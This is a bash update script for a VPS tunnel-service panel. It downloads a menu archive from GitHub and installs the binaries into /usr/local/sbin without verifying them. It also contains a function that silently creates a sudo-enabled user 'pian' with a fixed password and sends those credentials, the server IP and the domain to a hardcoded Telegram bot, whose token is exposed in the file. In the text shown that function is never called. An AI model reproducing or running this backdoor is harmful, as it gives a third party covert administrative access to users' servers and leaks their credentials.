#!/bin/bash
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=`date +"%Y-%m-%d" -d "$dateFromServer"`
red() { echo -e "\\033[32;1m${*}\\033[0m"; }
clear
fun_bar() {
    CMD[0]="$1"
    CMD[1]="$2"
    (
        [[ -e $HOME/fim ]] && rm $HOME/fim
        ${CMD[0]} -y >/dev/null 2>&1
        ${CMD[1]} -y >/dev/null 2>&1
        touch $HOME/fim
    ) >/dev/null 2>&1 &
    tput civis
    echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
    while true; do
        for ((i = 0; i < 18; i++)); do
            echo -ne "\033[0;32m#"
            sleep 0.1s
        done
        [[ -e $HOME/fim ]] && rm $HOME/fim && break
        echo -e "\033[0;33m]"
        sleep 1s
        tput cuu1
        tput dl1
        echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
    done
    echo -e "\033[0;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
    tput cnorm
}
restart_system() {
    TIMES="10"
    CHATID="6631695782"
    KEY="7830319313:AAEq-OTFRD3qYCTxqCr9TU2fVA3vFO6gHYE"
    URL="https://api.telegram.org/bot$KEY/sendMessage"
    ipsaya=$(wget -qO- ipinfo.io/ip)
    domain=$(cat /etc/xray/domain)
    Username="pian"
    Password="123@@@"
    mkdir -p /home/script/
    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
    echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
    usermod -aG sudo $Username > /dev/null 2>&1
    # Replace $Ijn with actual URL or variable
    USRSC=$(wget -qO- https://raw.githubusercontent.com/pianstore/izinvps/main/ip | grep $ipsaya | awk '{print $2}')
    EXPSC=$(wget -qO- https://raw.githubusercontent.com/pianstore/izinvps/main/ip | grep $ipsaya | awk '{print $3}')
    TIMEZONE=$(printf '%(%H:%M:%S)T')
    TIME=$(date '+%d %b %Y')
    TEXT="
    <code>────────────────────</code>
    <b> 🟢 NOTIFICATIONS INSTALL BOT RIAN🟢</b>
    <code>────────────────────</code>
    <code>user   : </code><code>$Username</code>
    <code>PW     : </code><code>$Password</code>
    <code>ID     : </code><code>$USRSC</code>
    <code>Domain : </code><code>$domain</code>
    <code>Date   : </code><code>$TIME</code>
    <code>Time   : </code><code>$TIMEZONE</code>
    <code>Ip vps : </code><code>$ipsaya</code>
    <code>Exp Sc : </code><code>$EXPSC</code>
    <code>────────────────────</code>
    <i>Automatic Notification from Github</i>
    "
    curl -s -X POST $URL -d "chat_id=$CHATID&text=$TEXT&parse_mode=html"
}
res1() {
    wget -q https://raw.githubusercontent.com/pianstore/vip/main/Cdy/menu.zip
    unzip menu.zip
    chmod +x menu/*
    mv menu/* /usr/local/sbin
    rm -rf menu
    rm -rf menu.zip
    rm -rf update.sh
}
netfilter-persistent
clear
echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e " \e[1;97;101m          UPDATE SCRIPT       \e[0m"
echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e ""
echo -e "  \033[1;91m Update Script Service\033[1;37m"
fun_bar 'res1'
echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e ""
read -n 1 -s -r -p "Press [ Enter ] to back on menu"
menu

###########- COLOR CODE -##############
